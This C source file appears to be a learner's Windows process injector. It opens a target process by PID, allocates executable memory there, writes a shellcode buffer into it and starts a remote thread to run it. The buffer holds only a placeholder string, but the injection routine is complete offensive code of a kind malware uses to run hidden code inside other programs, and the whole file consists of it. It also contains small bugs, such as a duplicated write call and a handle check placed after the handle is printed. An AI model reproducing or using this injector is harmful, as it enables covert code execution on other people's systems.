/*
Project: Create a process injector
Take some shellcode, provide a PID and inject the shellcode into to spwan the msgBox.

The API calls needed/used, are as follows (in this order):

OpenProcess
VirtualAllocEX
WriteProcessMemory
CreateRemoteThreadEx
CloseHandle
*/

//includes
#include <stdio.h>
#include <windows.h>

//macros for printf - this is totally new to me ...
#define  okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define  info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
#define  warn(msg, ...) printf("[!] " msg "\n", ##__VA_ARGS__)


// x64 shellcode here
static unsigned char sc[] = "Shell_code_here";


// Variables - declared and initialised (will be changed later depending on input)
DWORD PID, TID = NULL;
LPVOID baseadd = NULL;
HANDLE hProcess, hThread = NULL;


// main func
int main(int argc, char* argv[]) {

	if (argc < 2) {
		warn("usage: processInjector.exe <pid>");
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);
	info("I solemnly swear, I'm upto no good ;.)");
	info("trying to open a handle to process (%ld)\n", PID);

	// opens handle to process
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	okay("got a handle to the process!\n\t\\---> 0x%p\n", hProcess);

	//if no valid process, prints error msg
	if (hProcess == NULL) {
		warn("failed to get a handle to process (%ld), error: %ld\n", PID, GetLastError());
		return EXIT_FAILURE;
	}

	// allocates bytes to mem
	baseadd = VirtualAllocEx(hProcess, NULL, sizeof sc, MEM_COMMIT, PAGE_EXECUTE_READ);
	if (baseadd == NULL) {
		warn("failed to allocate memory, error %ld", GetLastError());
	}
	else {
		okay("Allocated %zu bytes with PAGE_EXECUTE_READ Permissions\n", sizeof(sc));
	}

	// actually writes bytes to mem
	SIZE_T bytes;
	WriteProcessMemory(hProcess, baseadd, sc, sizeof sc, &bytes);
	if (WriteProcessMemory(hProcess, baseadd, sc, sizeof sc, &bytes)) {
		okay("Wrote %zu bytes to process memory\n", bytes);
	}
	else {
		warn("Failed to write to process memory, error %ld", GetLastError());
	}

	// create thread to run sc
	HANDLE hThread;
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)baseadd, NULL, 0, 0, &TID);
	if (hThread != NULL) {
		okay("Created thread with handle: %ld\n\t\\---> 0x%p\n", TID, hThread);
	}
	else {
		warn("Failed to create handle to the thread, error %ld", GetLastError());
		CloseHandle(hProcess);
	}

	//
	WaitForSingleObject(hThread, INFINITE);
	okay("thread finished executing\n");

	info("Cleaning up our shenanigans ;.)");
	CloseHandle(hThread);
	CloseHandle(hProcess);
	okay("Everything's in order ... Mischief managed! :>\n");

	return EXIT_SUCCESS;

}
